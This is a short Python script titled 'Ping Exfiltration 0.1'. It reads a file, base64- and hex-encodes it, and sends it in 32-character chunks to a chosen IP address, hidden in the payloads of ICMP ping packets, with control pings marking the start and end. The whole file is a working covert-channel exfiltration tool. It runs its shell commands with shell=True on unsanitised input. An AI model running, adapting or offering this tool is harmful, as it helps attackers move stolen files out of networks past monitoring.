import base64
import argparse
import sys
import subprocess
from time import sleep


def check_args():
  parser = argparse.ArgumentParser("Ping Exfiltration 0.1\n")
  parser.add_argument("-d", "--dst_ip", action="store", dest="dst_ip", help="Destination IP")
  parser.add_argument("-f", "--file", action="store", dest="file", help="File to exfiltrate")

  args = parser.parse_args()
  if not args.dst_ip or not args.file:
    print("Required parameters not specified.")
    sys.exit(1)

  return args


def read_data(input_file):
  try:
    with open(input_file,"r") as exfiltrate_file:
      b64_encoded=base64.b64encode(exfiltrate_file.read().encode('utf-8'))
      hex_str=b64_encoded.hex()

    chunk_length = 32
    chunks = [hex_str[i:i+chunk_length] for i in range(0, len(hex_str), chunk_length)]

    if len(chunks[-1]) < 32:
      chunks[-1] = chunks[-1] + ('0'*(32-len(chunks[-1])))

    return chunks

  except FileNotFoundError:
    print("[*] Error: file not found.")
    sys.exit(1)


def send_control_ping(dst_ip, chunks_amount, start):
  if start:
    control_ping = "!{:014d}!".format(len(chunks))
  else:
    control_ping = "#"*16
  hex_control = control_ping.encode('utf-8').hex()
  subprocess.Popen("ping -c 1 -p '"+hex_control+"' "+dst_ip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


if __name__ == "__main__":
  args = check_args()

  chunks =read_data(args.file)
  send_control_ping(args.dst_ip, len(chunks), True)

  for chunk in chunks:
    subprocess.Popen("ping -c 1 -p '"+chunk+"' "+args.dst_ip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    sleep(0.3)

  send_control_ping(args.dst_ip, len(chunks), False)

